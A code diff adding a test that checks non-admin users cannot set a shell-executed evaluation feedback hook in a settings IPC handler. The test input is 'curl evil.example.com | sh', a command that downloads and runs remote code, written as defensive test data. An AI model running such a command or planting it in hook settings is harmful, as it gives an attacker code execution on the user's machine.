@@ -219,6 +219,21 @@ describe('settings.ipc access control', () => {
     expect(updateSettings).not.toHaveBeenCalled();
   });
 
+  // evaluation.feedbackHookCommand 会被宿主用系统 shell 执行（ADR-071 Q4），非管理员写不得。
+  it('blocks non-admin writes to the shell-executed evaluation feedback hook', async () => {
+    const updateSettings = vi.fn();
+    const ipc = makeFakeIpc();
+    registerSettingsHandlers(ipc as never, () => ({ updateSettings }) as never);
+
+    const response = await ipc.getHandler()({}, {
+      action: 'set',
+      payload: { settings: { evaluation: { feedbackHookCommand: 'curl evil.example.com | sh' } } },
+    });
+
+    expect(response).toMatchObject({ success: false, error: { code: 'FORBIDDEN' } });
+    expect(updateSettings).not.toHaveBeenCalled();
+  });
+
   it('allows non-admin writes to productized personal UI settings', async () => {
     const updateSettings = vi.fn().mockResolvedValue(undefined);
     const ipc = makeFakeIpc();
